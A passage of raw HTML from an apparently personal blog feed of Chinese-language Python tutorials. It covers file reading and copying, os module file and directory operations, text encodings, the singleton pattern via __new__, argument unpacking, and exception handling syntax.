class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">f.write(<span class="string">&quot;hello python！\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;今天天气真好&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="按行读取文件内容">2.5 按行读取文件内容</h3><ul><li><code>read</code> 方法默认会把文件的 <strong>所有内容</strong><strong>一次性读取到内存</strong></li><li>如果文件太大，对内存的占用会非常严重</li></ul><h4 id="readline-方法"><code>readline</code> 方法</h4><ul><li><code>readline</code> 方法可以一次读取一行内容</li><li>方法执行后，会把 <strong>文件指针</strong>移动到下一行，准备再次读取</li></ul><p><strong>读取大文件的正确姿势</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 读取一行内容</span></span><br><span class="line">    text = file.readline()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否读到内容</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每读取一行的末尾已经有了一个 `\n`</span></span><br><span class="line">    <span class="built_in">print</span>(text, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h3 id="文件读写案例-复制文件">2.6 文件读写案例 —— 复制文件</h3><p><strong>目标</strong></p><p>用代码的方式，来实现文件复制过程</p><h4 id="小文件复制">小文件复制</h4><p>对于小文件读取来说，使用 read 即可</p><ul><li>打开一个已有文件，读取完整内容，并写入到另外一个文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 打开文件</span></span><br><span class="line">file_read = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line">file_write = <span class="built_in">open</span>(<span class="string">&quot;README[复件]&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 读取并写入文件</span></span><br><span class="line">text = file_read.read()</span><br><span class="line">file_write.write(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 关闭文件</span></span><br><span class="line">file_read.close()</span><br><span class="line">file_write.close()</span><br></pre></td></tr></table></figure><h4 id="大文件复制">大文件复制</h4><p>大文件读取，需要使用 readline，read 一次读入全部，内存占用过大</p><ul><li>打开一个已有文件，逐行读取内容，并顺序写入到另外一个文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 打开文件</span></span><br><span class="line">file_read = <span class="built_in">open</span>(<span class="string">&quot;README&quot;</span>)</span><br><span class="line">file_write = <span class="built_in">open</span>(<span class="string">&quot;README[复件]&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 读取并写入文件</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 每次读取一行</span></span><br><span class="line">    text = file_read.readline()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断是否读取到内容</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    file_write.write(text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 关闭文件</span></span><br><span class="line">file_read.close()</span><br><span class="line">file_write.close()</span><br></pre></td></tr></table></figure><h2 id="文件目录的常用管理操作">03. 文件/目录的常用管理操作</h2><ul><li>在终端/文件浏览器中可以执行常规的文件/目录管理操作，例如：<ul><li>创建、重命名、删除、改变路径、查看目录内容、……</li></ul></li><li>在 <code>Python</code> 中，如果希望通过程序实现上述功能，需要导入<code>os</code> 模块</li></ul><h3 id="文件操作">文件操作</h3><table><thead><tr class="header"><th style="text-align: left;">序号</th><th style="text-align: left;">方法名</th><th style="text-align: left;">说明</th><th style="text-align: left;">示例</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">01</td><td style="text-align: left;">rename</td><td style="text-align: left;">重命名文件</td><tdstyle="text-align: left;"><code>os.rename(源文件名, 目标文件名)</code></td></tr><tr class="even"><td style="text-align: left;">02</td><td style="text-align: left;">remove</td><td style="text-align: left;">删除文件</td><td style="text-align: left;"><code>os.remove(文件名)</code></td></tr></tbody></table><h3 id="目录操作">目录操作</h3><table><thead><tr class="header"><th style="text-align: left;">序号</th><th style="text-align: left;">方法名</th><th style="text-align: left;">说明</th><th style="text-align: left;">示例</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">01</td><td style="text-align: left;">listdir</td><td style="text-align: left;">目录列表</td><td style="text-align: left;"><code>os.listdir(目录名)</code></td></tr><tr class="even"><td style="text-align: left;">02</td><td style="text-align: left;">mkdir</td><td style="text-align: left;">创建目录</td><td style="text-align: left;"><code>os.mkdir(目录名)</code></td></tr><tr class="odd"><td style="text-align: left;">03</td><td style="text-align: left;">rmdir</td><td style="text-align: left;">删除目录</td><td style="text-align: left;"><code>os.rmdir(目录名)</code></td></tr><tr class="even"><td style="text-align: left;">04</td><td style="text-align: left;">getcwd</td><td style="text-align: left;">获取当前目录</td><td style="text-align: left;"><code>os.getcwd()</code></td></tr><tr class="odd"><td style="text-align: left;">05</td><td style="text-align: left;">chdir</td><td style="text-align: left;">修改工作目录</td><td style="text-align: left;"><code>os.chdir(目标目录)</code></td></tr><tr class="even"><td style="text-align: left;">06</td><td style="text-align: left;">path.isdir</td><td style="text-align: left;">判断是否是文件</td><td style="text-align: left;"><code>os.path.isdir(文件路径)</code></td></tr></tbody></table><blockquote><p>提示：文件或者目录操作都支持 <strong>相对路径</strong> 和<strong>绝对路径</strong></p></blockquote><h2 id="文本文件的编码格式科普">04. 文本文件的编码格式（科普）</h2><ul><li>文本文件存储的内容是基于 <strong>字符编码</strong>的文件，常见的编码有 <code>ASCII</code> 编码，<code>UNICODE</code>编码等</li></ul><blockquote><p>Python 2.x 默认使用 <code>ASCII</code> 编码格式 Python 3.x 默认使用<code>UTF-8</code> 编码格式</p></blockquote><h3 id="ascii-编码和-unicode-编码">4.1 ASCII 编码和 UNICODE 编码</h3><h4 id="ascii-编码"><code>ASCII</code> 编码</h4><ul><li>计算机中只有 <code>256</code> 个 <code>ASCII</code> 字符</li><li>一个 ASCII 在内存中占用 1 个字节的空间<ul><li><code>8</code> 个 <code>0/1</code> 的排列组合方式一共有<code>256</code> 种，也就是 <code>2 ** 8</code></li></ul></li></ul><h4 id="utf-8-编码格式"><code>UTF-8</code> 编码格式</h4><ul><li>计算机中使用 <strong>1~6 个字节</strong> 来表示一个<code>UTF-8</code> 字符，涵盖了<strong>地球上几乎所有地区的文字</strong></li><li>大多数汉字会使用 <strong>3 个字节</strong> 表示</li><li><code>UTF-8</code> 是 <code>UNICODE</code> 编码的一种编码格式</li></ul><h3 id="ptyhon-2.x-中如何使用中文">4.2 Ptyhon 2.x 中如何使用中文</h3><blockquote><p>Python 2.x 默认使用 <code>ASCII</code> 编码格式 Python 3.x 默认使用<code>UTF-8</code> 编码格式</p></blockquote><ul><li>在 Python 2.x 文件的 <strong>第一行</strong>增加以下代码，解释器会以 <code>utf-8</code> 编码来处理 python 文件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *-* coding:utf8 *-*</span></span><br></pre></td></tr></table></figure><blockquote><p>这方式是官方推荐使用的！</p></blockquote><ul><li>也可以使用</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br></pre></td></tr></table></figure><h4 id="unicode-字符串">unicode 字符串</h4><ul><li>在 <code>Python 2.x</code> 中，即使指定了文件使用 <code>UTF-8</code>的编码格式，但是在遍历字符串时，仍然会 <strong>以字节为单位遍历</strong>字符串</li><li>要能够 <strong>正确的遍历字符串</strong>，在定义字符串时，需要<strong>在字符串的引号前</strong>，增加一个小写字母<code>u</code>，告诉解释器这是一个 <code>unicode</code> 字符串（使用<code>UTF-8</code> 编码格式的字符串）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># *-* coding:utf8 *-*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在字符串前，增加一个 `u` 表示这个字符串是一个 utf8 字符串</span></span><br><span class="line">hello_str = <span class="string">u&quot;你好世界&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hello_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> hello_str:</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure><h2 id="小结">小结</h2><h3 id="读取的方法">读取的方法</h3><ol type="1"><li>read()将所有内容读到一个字符串中（包括换行符）。可以加参数，指定要读多少个字符</li><li>readline() 一行一行读取，包括 </li><li>readlines(）将所有内容，按照行，分到列表中</li><li>seek(arg) 定位指针 seek(0） 将文件流指针定位到文件首。</li></ol><p>常用读取方法：</p><ol type="1"><li>for 循环与 readlines 迭代</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">  <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>因为读取的文件每行末尾有<code>\n</code>，而 print打印的时候，默认又会打印一个<code>\n</code>。所以<strong>最好的方法是让print 不打印 <code>\n</code>。</strong></p><p>或者通过字符串的 <code>strip()</code> 方法（默认去掉 whitespace，包括<code>\t,\r,\n</code>，空格）将文件中每一行末尾的 <code>\n</code>（Linux）或 <code>\r\n</code> （Windows）去除</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">  <span class="built_in">print</span>(i.strip())</span><br></pre></td></tr></table></figure><h2 id="新式类与旧式经典类">新式类与旧式（经典）类</h2><blockquote><p><code>objec</code> 是 <code>Python</code>为所有对象提供的<strong>基类</strong>，提供有一些内置的属性和方法，可以使用<code>dir</code>函数查看</p></blockquote><ul><li><p>新式类：以 <code>object</code>为基类的类，推荐使用</p></li><li><p>经典类：不以 <code>object</code>为基类的类，不推荐使用</p></li><li><p>在 <code>Python3, x</code>中定义类时，如果没有指定父类，会<strong>默认使用</strong><code>object</code> 作为该类的<strong>基类</strong>.</p><p>Python3, x 中定义的类都是新式类</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python single instance</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/py_single_instance/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/py_single_instance/</url>
      
        <content type="html"><![CDATA[<h2 id="单例设计模式">单例设计模式</h2><ul><li>设计模式<ul><li><strong>设计模式</strong> 是<strong>前人工作的总结和提炼</strong>，通常，被人们广泛流传的设计模式都是针对<strong>某一特定问题</strong> 的成熟的解决方案</li><li>使用 <strong>设计模式</strong>是为了可重用代码、让代码更容易被他人理解、保证代码可靠性</li></ul></li><li>单例设计模式<ul><li><strong>目的</strong> —— 让 <strong>类</strong> 创建的对象，在系统中<strong>只有</strong> <strong>唯一的一个实例</strong></li><li>每一次执行 <code>类名()</code>返回的对象，<strong>内存地址是相同的</strong></li></ul></li></ul><h3 id="单例设计模式的应用场景">单例设计模式的应用场景</h3><ul><li><strong>音乐播放</strong> 对象</li><li><strong>回收站</strong> 对象</li><li><strong>打印机</strong> 对象</li><li>……</li></ul><h2 id="new__-方法">02. <code>__new__</code> 方法</h2><ul><li>使用 <strong>类名()</strong> 创建对象时，<code>Python</code>的解释器 <strong>首先</strong> 会 调用 <code>__new__</code> 方法为对象<strong>分配空间</strong></li><li><code>__new__</code> 是一个由 <code>object</code>基类提供的内置的静态方法，主要作用有两个：<ul><li><ol type="1"><li>在内存中为对象 <strong>分配空间</strong></li></ol></li><li><ol start="2" type="1"><li><strong>返回</strong> 对象的引用</li></ol></li></ul></li><li><code>Python</code> 的解释器获得对象的 <strong>引用</strong>后，将引用作为 <strong>第一个参数</strong>，传递给 <code>__init__</code>方法</li></ul><blockquote><p>重写 <code>__new__</code> 方法 的代码非常固定！</p></blockquote><ul><li>重写 <code>__new__</code> 方法 <strong>一定要</strong><code>return super().__new__(cls)</code></li><li>否则 Python 的解释器 <strong>得不到</strong> 分配了空间的<strong>对象引用</strong>，<strong>就不会调用对象的初始化方法</strong></li><li>注意：<code>__new__</code> 是一个静态方法，在调用时需要<strong>主动传递</strong> <code>cls</code> 参数</li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203211584756399791.png"alt="new" /><figcaption aria-hidden="true"><strong>new</strong></figcaption></figure><p><strong>示例代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MusicPlayer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># 如果不返回任何结果，</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;初始化音乐播放对象&quot;</span>)</span><br><span class="line"></span><br><span class="line">player = MusicPlayer()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(player)</span><br></pre></td></tr></table></figure><h2 id="python-中的单例">03. Python 中的单例</h2><ul><li><p>单例</p><p>—— 让类 创建的对象，在系统中只有唯一的一个实例</p><ol type="1"><li>定义一个 <strong>类属性</strong>，初始值是<code>None</code>，用于记录 <strong>单例对象的引用</strong></li><li>重写 <code>__new__</code> 方法</li><li>如果 <strong>类属性</strong><code>is None</code>，调用父类方法分配空间，并在类属性中记录结果</li><li>返回 <strong>类属性</strong> 中记录的 <strong>对象引用</strong></li></ol></li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203211584756337404.png"alt="单例" /><figcaption aria-hidden="true">单例</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MusicPlayer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义类属性记录单例对象引用</span></span><br><span class="line">    instance = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. 判断类属性是否已经被赋值</span></span><br><span class="line">        <span class="keyword">if</span> cls.instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            cls.instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 返回类属性的单例引用</span></span><br><span class="line">        <span class="keyword">return</span> cls.instance</span><br></pre></td></tr></table></figure><h3 id="只执行一次初始化工作">只执行一次初始化工作</h3><ul><li>在每次使用 类名() 创建对象时，Python 的解释器都会自动调用两个方法：<ul><li><code>__new__</code> 分配空间</li><li><code>__init__</code> 对象初始化</li></ul></li><li>在上一小节对 <code>__new__</code> 方法改造之后，每次都会得到<strong>第一次被创建对象的引用</strong></li><li>但是：<strong>初始化方法还会被再次调用</strong></li></ul><p><strong>需求</strong></p><ul><li>让 <strong>初始化动作</strong> 只被 <strong>执行一次</strong></li></ul><p><strong>解决办法</strong></p><ol type="1"><li>定义一个类属性 <code>init_flag</code> 标记是否<strong>执行过初始化动作</strong>，初始值为 <code>False</code></li><li>在 <code>__init__</code> 方法中，判断 <code>init_flag</code>，如果为<code>False</code> 就执行初始化动作</li><li>然后将 <code>init_flag</code> 设置为 <code>True</code></li><li>这样，再次 <strong>自动</strong> 调用 <code>__init__</code>方法时，<strong>初始化动作就不会被再次执行</strong> 了</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MusicPlayer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 记录第一个被创建对象的引用</span></span><br><span class="line">    instance = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 记录是否执行过初始化动作</span></span><br><span class="line">    init_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, *args, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. 判断类属性是否是空对象</span></span><br><span class="line">        <span class="keyword">if</span> cls.instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 2. 调用父类的方法，为第一个对象分配空间</span></span><br><span class="line">            cls.instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 返回类属性保存的对象引用</span></span><br><span class="line">        <span class="keyword">return</span> cls.instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#  1. 判断是否执行过初始化动作</span></span><br><span class="line">        <span class="keyword">if</span> MusicPlayer.init_flag:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 如果没有执行过,则执行初始化动作</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;初始化播放器&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 执行初始化动作之后,修改类属性的标记</span></span><br><span class="line">        MusicPlayer.init_flag = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建多个对象</span></span><br><span class="line">player1 = MusicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player1)</span><br><span class="line"></span><br><span class="line">player2 = MusicPlayer()</span><br><span class="line"><span class="built_in">print</span>(player2)</span><br></pre></td></tr></table></figure><h1 id="知识点补充">知识点补充</h1><p><ahref="https://blog.csdn.net/qq_41780295/article/details/89112376">Python学习：多值参数 以及 元组和字典的拆包</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">demo</span>(<span class="params">num, *args, **kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tup = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">dic = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;小明&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">18</span>, <span class="string">&quot;weight&quot;</span>: <span class="number">178</span>&#125;</span><br><span class="line">demo(<span class="number">1</span>, *tup, **dic)</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">(<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;小明&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;weight&#x27;</span>: <span class="number">178</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python exception handling</title>
      <link href="/blog/2020/03/22/programming/python/2.object-oriented/exception/"/>
      <url>/blog/2020/03/22/programming/python/2.object-oriented/exception/</url>
      
        <content type="html"><![CDATA[<h2 id="概念">概念</h2><ul><li>程序在运行时，如果 Python解释器<strong>遇到</strong>一个错误，<strong>会停止程序的执行，并且提示一些错误信息</strong>，这就是<strong>异常</strong></li><li><strong>程序停止执行并且提示错误信息</strong>这个动作，我们通常称之为：<strong>抛出（raise）异常</strong></li></ul><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20203211584756455085.png"alt="exception" /><figcaption aria-hidden="true">exception</figcaption></figure><p>程序开发时，很难将<strong>所有的特殊情况</strong>都处理的面面俱到，通过<strong>异常捕获</strong>可以针对突发事件倣集中的处理，从而保证程序的<strong>稳定性和健壯性</strong></p><h2 id="捕获异常">捕获异常</h2><p>在程序开发中，如果<strong>对某些代码的执行不能确定是否正确</strong>，可以增加<code>try(尝试)</code> 来 <strong>捕获异常</strong></p><ul><li><code>try</code><strong>尝试</strong>，下方编写要尝试代码，不确定是否能够正常执行的代码</li><li><code>except</code><strong>如果不是</strong>，下方编写尝试失败的代码</li></ul><h3 id="错误类型捕获">错误类型捕获</h3><ul><li>在程序执行时，可能会遇到 <strong>不同类型的异常</strong>，并且需要<strong>针对不同类型的异常，做出不同的响应</strong>，这个时候，就需要捕获错误类型了</li><li>programming 根据引发异常的原因，将异常分为了很多种不同类别，在except 子句中可以分别捕获指定类别的异常。</li><li>语法如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 尝试执行的代码</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> 错误类型<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># 针对错误类型1，对应的代码处理</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> (错误类型<span class="number">2</span>, 错误类型<span class="number">3</span>):</span><br><span class="line">    <span class="comment"># 针对错误类型2 和 3，对应的代码处理</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未知错误 %s&quot;</span> % result)</span><br></pre></td></tr></table></figure><ul><li>当 <code>Python</code> 解释器 <strong>抛出异常</strong>时，<strong>最后一行错误信息的第一个单词，就是错误类型</strong></li></ul><h3 id="异常捕获完整语法">异常捕获完整语法</h3><ul><li>在实际开发中，为了能够处理复杂的异常情况，完整的异常语法如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 尝试执行的代码</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> 错误类型<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># 针对错误类型1，对应的代码处理</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> 错误类型<span class="number">2</span>:</span><br><span class="line">    <span class="comment"># 针对错误类型2，对应的代码处理</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> (错误类型<span class="number">3</span>, 错误类型<span class="number">4</span>):</span><br><span class="line">    <span class="comment"># 针对错误类型3 和 4，对应的代码处理</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="comment"># 打印错误信息</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 没有异常才会执行的代码</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 无论是否有异常，都会执行的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;无论是否有异常，都会执行的代码&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>else</code> 放在 except:后面只有在没有异常时才会执行的代码，有异常发生时，就不会再执行（即使你进行了异常捕获）</li><li><code>finally</code> 无论是否有异常，都会执行的代码</li></ul><h4 id="捕获未知错误">捕获未知错误</h4><ul><li>在开发时，<strong>要预判到所有可能出现的错误</strong>，还是有一定难度的</li><li>如果希望程序 <strong>无论出现任何错误</strong>，都不会因为<code>Python</code> 解释器<strong>抛出异常而被终止</strong>，一般在最后增加一个<code>except</code></li></ul><p>语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未知错误 %s&quot;</span> % result)</span><br></pre></td></tr></table></figure><h4 id="异常类型捕获演练-要求用户输入整数">异常类型捕获演练 ——要求用户输入整数</h4><p><strong>需求</strong></p><ol 